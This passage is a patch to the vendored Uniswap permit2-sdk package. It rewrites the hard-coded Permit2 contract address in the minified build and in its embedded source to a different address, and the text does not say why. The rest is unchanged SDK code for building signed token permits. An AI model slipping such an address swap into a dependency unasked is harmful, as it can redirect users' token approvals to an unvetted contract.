ISignatureTransfer.SignatureTransferDetails[]",name:"transferDetails",type:"tuple[]"},{internalType:"bytes32",name:"witness",type:"bytes32"},{internalType:"string",name:"witnessTypeName",type:"string"},{internalType:"string",name:"witnessType",type:"string"},{internalType:"bytes",name:"signature",type:"bytes"}],name:"permitWitnessTransferFrom",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"token",type:"address"},{internalType:"address",name:"from",type:"address"},{internalType:"address",name:"to",type:"address"},{internalType:"uint160",name:"amount",type:"uint160"}],name:"transferFrom",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"from",type:"address"},{components:[{internalType:"address",name:"token",type:"address"},{internalType:"uint160",name:"amount",type:"uint160"},{internalType:"address",name:"to",type:"address"}],internalType:"struct IAllowanceTransfer.AllowanceTransferDetails[]",name:"transferDetails",type:"tuple[]"}],name:"transferFrom",outputs:[],stateMutability:"nonpayable",type:"function"}];exports.AllowanceProvider=function(){function e(e,t){this.provider=e,this.permit2Address=t,this.permit2=new a.Contract(this.permit2Address,L,this.provider)}var t=e.prototype;return t.getAllowanceData=function(){var e=P(x().mark((function e(t,n,r){return x().wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,this.permit2.allowance(n,t,r);case 2:return e.abrupt("return",e.sent);case 3:case"end":return e.stop()}}),e,this)})));return function(t,n,r){return e.apply(this,arguments)}}(),t.getAllowance=function(){var e=P(x().mark((function e(t,n,r){return x().wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,this.getAllowanceData(t,n,r);case 2:return e.abrupt("return",e.sent.amount);case 3:case"end":return e.stop()}}),e,this)})));return function(t,n,r){return e.apply(this,arguments)}}(),t.getNonce=function(){var e=P(x().mark((function e(t,n,r){return x().wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,this.getAllowanceData(t,n,r);case 2:return e.abrupt("return",e.sent.nonce);case 3:case"end":return e.stop()}}),e,this)})));return function(t,n,r){return e.apply(this,arguments)}}(),t.getExpiration=function(){var e=P(x().mark((function e(t,n,r){return x().wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,this.getAllowanceData(t,n,r);case 2:return e.abrupt("return",e.sent.expiration);case 3:case"end":return e.stop()}}),e,this)})));return function(t,n,r){return e.apply(this,arguments)}}(),e}(),exports.AllowanceTransfer=g,exports.InstantExpiration=c,exports.MaxAllowanceExpiration=u,exports.MaxAllowanceTransferAmount=p,exports.MaxOrderedNonce=y,exports.MaxSigDeadline=m,exports.MaxSignatureTransferAmount=d,exports.MaxUint160=s,exports.MaxUint256=o,exports.MaxUint48=i,exports.MaxUnorderedNonce=l,exports.PERMIT2_ADDRESS="0x00000000BD0047637ac6BA3af44b52005ceD9557",exports.SignatureTransfer=D;
 //# sourceMappingURL=permit2-sdk.cjs.production.min.js.map
diff --git a/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.production.min.js.map b/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.production.min.js.map
index f228496..aa9f6ba 100644
--- a/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.production.min.js.map
+++ b/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.production.min.js.map
@@ -1 +1 @@
-{"version":3,"file":"permit2-sdk.cjs.production.min.js","sources":["../src/constants.ts","../src/domain.ts","../src/allowanceTransfer.ts","../src/signatureTransfer.ts","../src/providers/AllowanceProvider.ts"],"sourcesContent":["import { BigNumber } from '@ethersproject/bignumber'\n\nexport const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'\n\nexport const MaxUint48 = BigNumber.from('0xffffffffffff')\nexport const MaxUint160 = BigNumber.from('0xffffffffffffffffffffffffffffffffffffffff')\nexport const MaxUint256 = BigNumber.from('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')\n\n// alias max types for their usages\n// allowance transfer types\nexport const MaxAllowanceTransferAmount = MaxUint160\nexport const MaxAllowanceExpiration = MaxUint48\nexport const MaxOrderedNonce = MaxUint48\n\n// signature transfer types\nexport const MaxSignatureTransferAmount = MaxUint256\nexport const MaxUnorderedNonce = MaxUint256\nexport const MaxSigDeadline = MaxUint256\n\nexport const InstantExpiration: BigNumber = BigNumber.from(0)\n","import { TypedDataDomain, TypedDataField } from '@ethersproject/abstract-signer'\n\nconst PERMIT2_DOMAIN_NAME = 'Permit2'\n\nexport function permit2Domain(permit2Address: string, chainId: number): TypedDataDomain {\n  return {\n    name: PERMIT2_DOMAIN_NAME,\n    chainId,\n    verifyingContract: permit2Address,\n  }\n}\n\nexport type PermitData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: any\n}\n","import invariant from 'tiny-invariant'\nimport { TypedDataDomain, TypedDataField } from '@ethersproject/abstract-signer'\nimport { BigNumberish } from '@ethersproject/bignumber'\nimport { _TypedDataEncoder } from '@ethersproject/hash'\nimport { MaxSigDeadline, MaxOrderedNonce, MaxAllowanceTransferAmount, MaxAllowanceExpiration } from './constants'\nimport { permit2Domain } from './domain'\n\nexport interface PermitDetails {\n  token: string\n  amount: BigNumberish\n  expiration: BigNumberish\n  nonce: BigNumberish\n}\n\nexport interface PermitSingle {\n  details: PermitDetails\n  spender: string\n  sigDeadline: BigNumberish\n}\n\nexport interface PermitBatch {\n  details: PermitDetails[]\n  spender: string\n  sigDeadline: BigNumberish\n}\n\nexport type PermitSingleData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitSingle\n}\n\nexport type PermitBatchData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitBatch\n}\n\nconst PERMIT_DETAILS = [\n  { name: 'token', type: 'address' },\n  { name: 'amount', type: 'uint160' },\n  { name: 'expiration', type: 'uint48' },\n  { name: 'nonce', type: 'uint48' },\n]\n\nconst PERMIT_TYPES = {\n  PermitSingle: [\n    { name: 'details', type: 'PermitDetails' },\n    { name: 'spender', type: 'address' },\n    { name: 'sigDeadline', type: 'uint256' },\n  ],\n  PermitDetails: PERMIT_DETAILS,\n}\n\nconst PERMIT_BATCH_TYPES = {\n  PermitBatch: [\n    { name: 'details', type: 'PermitDetails[]' },\n    { name: 'spender', type: 'address' },\n    { name: 'sigDeadline', type: 'uint256' },\n  ],\n  PermitDetails: PERMIT_DETAILS,\n}\n\nfunction isPermit(permit: PermitSingle | PermitBatch): permit is PermitSingle {\n  return !Array.isArray(permit.details)\n}\n\nexport abstract class AllowanceTransfer {\n  /**\n   * Cannot be constructed.\n   */\n  private constructor() {}\n\n  // return the data to be sent in a eth_signTypedData RPC call\n  // for signing the given permit data\n  public static getPermitData(\n    permit: PermitSingle | PermitBatch,\n    permit2Address: string,\n    chainId: number\n  ): PermitSingleData | PermitBatchData {\n    invariant(MaxSigDeadline.gte(permit.sigDeadline), 'SIG_DEADLINE_OUT_OF_RANGE')\n\n    const domain = permit2Domain(permit2Address, chainId)\n    if (isPermit(permit)) {\n      validatePermitDetails(permit.details)\n      return {\n        domain,\n        types: PERMIT_TYPES,\n        values: permit,\n      }\n    } else {\n      permit.details.forEach(validatePermitDetails)\n      return {\n        domain,\n        types: PERMIT_BATCH_TYPES,\n        values: permit,\n      }\n    }\n  }\n\n  public static hash(permit: PermitSingle | PermitBatch, permit2Address: string, chainId: number): string {\n    const { domain, types, values } = AllowanceTransfer.getPermitData(permit, permit2Address, chainId)\n    return _TypedDataEncoder.hash(domain, types, values)\n  }\n}\n\nfunction validatePermitDetails(details: PermitDetails) {\n  invariant(MaxOrderedNonce.gte(details.nonce), 'NONCE_OUT_OF_RANGE')\n  invariant(MaxAllowanceTransferAmount.gte(details.amount), 'AMOUNT_OUT_OF_RANGE')\n  invariant(MaxAllowanceExpiration.gte(details.expiration), 'EXPIRATION_OUT_OF_RANGE')\n}\n","import invariant from 'tiny-invariant'\nimport { TypedDataDomain, TypedDataField } from '@ethersproject/abstract-signer'\nimport { BigNumberish } from '@ethersproject/bignumber'\nimport { _TypedDataEncoder } from '@ethersproject/hash'\nimport { permit2Domain } from './domain'\nimport { MaxSigDeadline, MaxUnorderedNonce, MaxSignatureTransferAmount } from './constants'\n\nexport interface Witness {\n  witness: any\n  witnessTypeName: string\n  witnessType: Record<string, TypedDataField[]>\n}\n\nexport interface TokenPermissions {\n  token: string\n  amount: BigNumberish\n}\n\nexport interface PermitTransferFrom {\n  permitted: TokenPermissions\n  spender: string\n  nonce: BigNumberish\n  deadline: BigNumberish\n}\n\nexport interface PermitBatchTransferFrom {\n  permitted: TokenPermissions[]\n  spender: string\n  nonce: BigNumberish\n  deadline: BigNumberish\n}\n\nexport type PermitTransferFromData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitTransferFrom\n}\n\nexport type PermitBatchTransferFromData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitBatchTransferFrom\n}\n\nconst TOKEN_PERMISSIONS = [\n  { name: 'token', type: 'address' },\n  { name: 'amount', type: 'uint256' },\n]\n\nconst PERMIT_TRANSFER_FROM_TYPES = {\n  PermitTransferFrom: [\n    { name: 'permitted', type: 'TokenPermissions' },\n    { name: 'spender', type: 'address' },\n    { name: 'nonce', type: 'uint256' },\n    { name: 'deadline', type: 'uint256' },\n  ],\n  TokenPermissions: TOKEN_PERMISSIONS,\n}\n\nconst PERMIT_BATCH_TRANSFER_FROM_TYPES = {\n  PermitBatchTransferFrom: [\n    { name: 'permitted', type: 'TokenPermissions[]' },\n    { name: 'spender', type: 'address' },\n    { name: 'nonce', type: 'uint256' },\n    { name: 'deadline', type: 'uint256' },\n  ],\n  TokenPermissions: TOKEN_PERMISSIONS,\n}\n\nfunction permitTransferFromWithWitnessType(witness: Witness): Record<string, TypedDataField[]> {\n  return {\n    PermitWitnessTransferFrom: [\n      { name: 'permitted', type: 'TokenPermissions' },\n      { name: 'spender', type: 'address' },\n      { name: 'nonce', type: 'uint256' },\n      { name: 'deadline', type: 'uint256' },\n      { name: 'witness', type: witness.witnessTypeName },\n    ],\n    TokenPermissions: TOKEN_PERMISSIONS,\n    ...witness.witnessType,\n  }\n}\n\nfunction permitBatchTransferFromWithWitnessType(witness: Witness): Record<string, TypedDataField[]> {\n  return {\n    PermitBatchWitnessTransferFrom: [\n      { name: 'permitted', type: 'TokenPermissions[]' },\n      { name: 'spender', type: 'address' },\n      { name: 'nonce', type: 'uint256' },\n      { name: 'deadline', type: 'uint256' },\n      { name: 'witness', type: witness.witnessTypeName },\n    ],\n    TokenPermissions: TOKEN_PERMISSIONS,\n    ...witness.witnessType,\n  }\n}\n\nfunction isPermitTransferFrom(permit: PermitTransferFrom | PermitBatchTransferFrom): permit is PermitTransferFrom {\n  return !Array.isArray(permit.permitted)\n}\n\nexport abstract class SignatureTransfer {\n  /**\n   * Cannot be constructed.\n   */\n  private constructor() {}\n\n  // return the data to be sent in a eth_signTypedData RPC call\n  // for signing the given permit data\n  public static getPermitData(\n    permit: PermitTransferFrom | PermitBatchTransferFrom,\n    permit2Address: string,\n    chainId: number,\n    witness?: Witness\n  ): PermitTransferFromData | PermitBatchTransferFromData {\n    invariant(MaxSigDeadline.gte(permit.deadline), 'SIG_DEADLINE_OUT_OF_RANGE')\n    invariant(MaxUnorderedNonce.gte(permit.nonce), 'NONCE_OUT_OF_RANGE')\n\n    const domain = permit2Domain(permit2Address, chainId)\n    if (isPermitTransferFrom(permit)) {\n      validateTokenPermissions(permit.permitted)\n      const types = witness ? permitTransferFromWithWitnessType(witness) : PERMIT_TRANSFER_FROM_TYPES\n      const values = witness ? Object.assign(permit, { witness: witness.witness }) : permit\n      return {\n        domain,\n        types,\n        values,\n      }\n    } else {\n      permit.permitted.forEach(validateTokenPermissions)\n      const types = witness ? permitBatchTransferFromWithWitnessType(witness) : PERMIT_BATCH_TRANSFER_FROM_TYPES\n      const values = witness ? Object.assign(permit, { witness: witness.witness }) : permit\n      return {\n        domain,\n        types,\n        values,\n      }\n    }\n  }\n\n  public static hash(\n    permit: PermitTransferFrom | PermitBatchTransferFrom,\n    permit2Address: string,\n    chainId: number,\n    witness?: Witness\n  ): string {\n    const { domain, types, values } = SignatureTransfer.getPermitData(permit, permit2Address, chainId, witness)\n    return _TypedDataEncoder.hash(domain, types, values)\n  }\n}\n\nfunction validateTokenPermissions(permissions: TokenPermissions) {\n  invariant(MaxSignatureTransferAmount.gte(permissions.amount), 'AMOUNT_OUT_OF_RANGE')\n}\n","import { BigNumber } from '@ethersproject/bignumber'\nimport { Provider } from '@ethersproject/providers'\nimport Permit2Abi from '../../abis/Permit2.json'\nimport { Contract } from '@ethersproject/contracts'\n\nexport interface AllowanceData {\n  amount: BigNumber\n  nonce: number\n  expiration: number\n}\n\nexport class AllowanceProvider {\n  private permit2: Contract\n\n  constructor(private provider: Provider, private permit2Address: string) {\n    this.permit2 = new Contract(this.permit2Address, Permit2Abi, this.provider)\n  }\n\n  async getAllowanceData(token: string, owner: string, spender: string): Promise<AllowanceData> {\n    return await this.permit2.allowance(owner, token, spender)\n  }\n\n  async getAllowance(token: string, owner: string, spender: string): Promise<BigNumber> {\n    return (await this.getAllowanceData(token, owner, spender)).amount\n  }\n\n  async getNonce(token: string, owner: string, spender: string): Promise<number> {\n    return (await this.getAllowanceData(token, owner, spender)).nonce\n  }\n\n  async getExpiration(token: string, owner: string, spender: string): Promise<number> {\n    return (await this.getAllowanceData(token, owner, spender)).expiration\n  }\n}\n"],"names":["MaxUint48","BigNumber","from","MaxUint160","MaxUint256","MaxAllowanceTransferAmount","MaxAllowanceExpiration","MaxOrderedNonce","MaxSignatureTransferAmount","MaxUnorderedNonce","MaxSigDeadline","InstantExpiration","permit2Domain","permit2Address","chainId","name","verifyingContract","PERMIT_DETAILS","type","PERMIT_TYPES","PermitSingle","PermitDetails","PERMIT_BATCH_TYPES","PermitBatch","AllowanceTransfer","getPermitData","permit","gte","sigDeadline","invariant","domain","Array","isArray","details","isPermit","validatePermitDetails","types","values","forEach","hash","_TypedDataEncoder","nonce","amount","expiration","TOKEN_PERMISSIONS","PERMIT_TRANSFER_FROM_TYPES","PermitTransferFrom","TokenPermissions","PERMIT_BATCH_TRANSFER_FROM_TYPES","PermitBatchTransferFrom","SignatureTransfer","witness","deadline","permitted","isPermitTransferFrom","validateTokenPermissions","PermitWitnessTransferFrom","witnessTypeName","witnessType","permitTransferFromWithWitnessType","Object","assign","PermitBatchWitnessTransferFrom","permitBatchTransferFromWithWitnessType","permissions","provider","this","permit2","Contract","Permit2Abi","_proto","getAllowanceData","token","owner","spender","_context","allowance","getAllowance","_context2","getNonce","_context3","getExpiration","_context4"],"mappings":"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"}
\ No newline at end of file
+{"version":3,"file":"permit2-sdk.cjs.production.min.js","sources":["../src/constants.ts","../src/domain.ts","../src/allowanceTransfer.ts","../src/signatureTransfer.ts","../src/providers/AllowanceProvider.ts"],"sourcesContent":["import { BigNumber } from '@ethersproject/bignumber'\n\nexport const PERMIT2_ADDRESS = '0x00000000BD0047637ac6BA3af44b52005ceD9557'\n\nexport const MaxUint48 = BigNumber.from('0xffffffffffff')\nexport const MaxUint160 = BigNumber.from('0xffffffffffffffffffffffffffffffffffffffff')\nexport const MaxUint256 = BigNumber.from('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')\n\n// alias max types for their usages\n// allowance transfer types\nexport const MaxAllowanceTransferAmount = MaxUint160\nexport const MaxAllowanceExpiration = MaxUint48\nexport const MaxOrderedNonce = MaxUint48\n\n// signature transfer types\nexport const MaxSignatureTransferAmount = MaxUint256\nexport const MaxUnorderedNonce = MaxUint256\nexport const MaxSigDeadline = MaxUint256\n\nexport const InstantExpiration: BigNumber = BigNumber.from(0)\n","import { TypedDataDomain, TypedDataField } from '@ethersproject/abstract-signer'\n\nconst PERMIT2_DOMAIN_NAME = 'Permit2'\n\nexport function permit2Domain(permit2Address: string, chainId: number): TypedDataDomain {\n  return {\n    name: PERMIT2_DOMAIN_NAME,\n    chainId,\n    verifyingContract: permit2Address,\n  }\n}\n\nexport type PermitData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: any\n}\n","import invariant from 'tiny-invariant'\nimport { TypedDataDomain, TypedDataField } from '@ethersproject/abstract-signer'\nimport { BigNumberish } from '@ethersproject/bignumber'\nimport { _TypedDataEncoder } from '@ethersproject/hash'\nimport { MaxSigDeadline, MaxOrderedNonce, MaxAllowanceTransferAmount, MaxAllowanceExpiration } from './constants'\nimport { permit2Domain } from './domain'\n\nexport interface PermitDetails {\n  token: string\n  amount: BigNumberish\n  expiration: BigNumberish\n  nonce: BigNumberish\n}\n\nexport interface PermitSingle {\n  details: PermitDetails\n  spender: string\n  sigDeadline: BigNumberish\n}\n\nexport interface PermitBatch {\n  details: PermitDetails[]\n  spender: string\n  sigDeadline: BigNumberish\n}\n\nexport type PermitSingleData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitSingle\n}\n\nexport type PermitBatchData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitBatch\n}\n\nconst PERMIT_DETAILS = [\n  { name: 'token', type: 'address' },\n  { name: 'amount', type: 'uint160' },\n  { name: 'expiration', type: 'uint48' },\n  { name: 'nonce', type: 'uint48' },\n]\n\nconst PERMIT_TYPES = {\n  PermitSingle: [\n    { name: 'details', type: 'PermitDetails' },\n    { name: 'spender', type: 'address' },\n    { name: 'sigDeadline', type: 'uint256' },\n  ],\n  PermitDetails: PERMIT_DETAILS,\n}\n\nconst PERMIT_BATCH_TYPES = {\n  PermitBatch: [\n    { name: 'details', type: 'PermitDetails[]' },\n    { name: 'spender', type: 'address' },\n    { name: 'sigDeadline', type: 'uint256' },\n  ],\n  PermitDetails: PERMIT_DETAILS,\n}\n\nfunction isPermit(permit: PermitSingle | PermitBatch): permit is PermitSingle {\n  return !Array.isArray(permit.details)\n}\n\nexport abstract class AllowanceTransfer {\n  /**\n   * Cannot be constructed.\n   */\n  private constructor() {}\n\n  // return the data to be sent in a eth_signTypedData RPC call\n  // for signing the given permit data\n  public static getPermitData(\n    permit: PermitSingle | PermitBatch,\n    permit2Address: string,\n    chainId: number\n  ): PermitSingleData | PermitBatchData {\n    invariant(MaxSigDeadline.gte(permit.sigDeadline), 'SIG_DEADLINE_OUT_OF_RANGE')\n\n    const domain = permit2Domain(permit2Address, chainId)\n    if (isPermit(permit)) {\n      validatePermitDetails(permit.details)\n      return {\n        domain,\n        types: PERMIT_TYPES,\n        values: permit,\n      }\n    } else {\n      permit.details.forEach(validatePermitDetails)\n      return {\n        domain,\n        types: PERMIT_BATCH_TYPES,\n        values: permit,\n      }\n    }\n  }\n\n  public static hash(permit: PermitSingle | PermitBatch, permit2Address: string, chainId: number): string {\n    const { domain, types, values } = AllowanceTransfer.getPermitData(permit, permit2Address, chainId)\n    return _TypedDataEncoder.hash(domain, types, values)\n  }\n}\n\nfunction validatePermitDetails(details: PermitDetails) {\n  invariant(MaxOrderedNonce.gte(details.nonce), 'NONCE_OUT_OF_RANGE')\n  invariant(MaxAllowanceTransferAmount.gte(details.amount), 'AMOUNT_OUT_OF_RANGE')\n  invariant(MaxAllowanceExpiration.gte(details.expiration), 'EXPIRATION_OUT_OF_RANGE')\n}\n","import invariant from 'tiny-invariant'\nimport { TypedDataDomain, TypedDataField } from '@ethersproject/abstract-signer'\nimport { BigNumberish } from '@ethersproject/bignumber'\nimport { _TypedDataEncoder } from '@ethersproject/hash'\nimport { permit2Domain } from './domain'\nimport { MaxSigDeadline, MaxUnorderedNonce, MaxSignatureTransferAmount } from './constants'\n\nexport interface Witness {\n  witness: any\n  witnessTypeName: string\n  witnessType: Record<string, TypedDataField[]>\n}\n\nexport interface TokenPermissions {\n  token: string\n  amount: BigNumberish\n}\n\nexport interface PermitTransferFrom {\n  permitted: TokenPermissions\n  spender: string\n  nonce: BigNumberish\n  deadline: BigNumberish\n}\n\nexport interface PermitBatchTransferFrom {\n  permitted: TokenPermissions[]\n  spender: string\n  nonce: BigNumberish\n  deadline: BigNumberish\n}\n\nexport type PermitTransferFromData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitTransferFrom\n}\n\nexport type PermitBatchTransferFromData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitBatchTransferFrom\n}\n\nconst TOKEN_PERMISSIONS = [\n  { name: 'token', type: 'address' },\n  { name: 'amount', type: 'uint256' },\n]\n\nconst PERMIT_TRANSFER_FROM_TYPES = {\n  PermitTransferFrom: [\n    { name: 'permitted', type: 'TokenPermissions' },\n    { name: 'spender', type: 'address' },\n    { name: 'nonce', type: 'uint256' },\n    { name: 'deadline', type: 'uint256' },\n  ],\n  TokenPermissions: TOKEN_PERMISSIONS,\n}\n\nconst PERMIT_BATCH_TRANSFER_FROM_TYPES = {\n  PermitBatchTransferFrom: [\n    { name: 'permitted', type: 'TokenPermissions[]' },\n    { name: 'spender', type: 'address' },\n    { name: 'nonce', type: 'uint256' },\n    { name: 'deadline', type: 'uint256' },\n  ],\n  TokenPermissions: TOKEN_PERMISSIONS,\n}\n\nfunction permitTransferFromWithWitnessType(witness: Witness): Record<string, TypedDataField[]> {\n  return {\n    PermitWitnessTransferFrom: [\n      { name: 'permitted', type: 'TokenPermissions' },\n      { name: 'spender', type: 'address' },\n      { name: 'nonce', type: 'uint256' },\n      { name: 'deadline', type: 'uint256' },\n      { name: 'witness', type: witness.witnessTypeName },\n    ],\n    TokenPermissions: TOKEN_PERMISSIONS,\n    ...witness.witnessType,\n  }\n}\n\nfunction permitBatchTransferFromWithWitnessType(witness: Witness): Record<string, TypedDataField[]> {\n  return {\n    PermitBatchWitnessTransferFrom: [\n      { name: 'permitted', type: 'TokenPermissions[]' },\n      { name: 'spender', type: 'address' },\n      { name: 'nonce', type: 'uint256' },\n      { name: 'deadline', type: 'uint256' },\n      { name: 'witness', type: witness.witnessTypeName },\n    ],\n    TokenPermissions: TOKEN_PERMISSIONS,\n    ...witness.witnessType,\n  }\n}\n\nfunction isPermitTransferFrom(permit: PermitTransferFrom | PermitBatchTransferFrom): permit is PermitTransferFrom {\n  return !Array.isArray(permit.permitted)\n}\n\nexport abstract class SignatureTransfer {\n  /**\n   * Cannot be constructed.\n   */\n  private constructor() {}\n\n  // return the data to be sent in a eth_signTypedData RPC call\n  // for signing the given permit data\n  public static getPermitData(\n    permit: PermitTransferFrom | PermitBatchTransferFrom,\n    permit2Address: string,\n    chainId: number,\n    witness?: Witness\n  ): PermitTransferFromData | PermitBatchTransferFromData {\n    invariant(MaxSigDeadline.gte(permit.deadline), 'SIG_DEADLINE_OUT_OF_RANGE')\n    invariant(MaxUnorderedNonce.gte(permit.nonce), 'NONCE_OUT_OF_RANGE')\n\n    const domain = permit2Domain(permit2Address, chainId)\n    if (isPermitTransferFrom(permit)) {\n      validateTokenPermissions(permit.permitted)\n      const types = witness ? permitTransferFromWithWitnessType(witness) : PERMIT_TRANSFER_FROM_TYPES\n      const values = 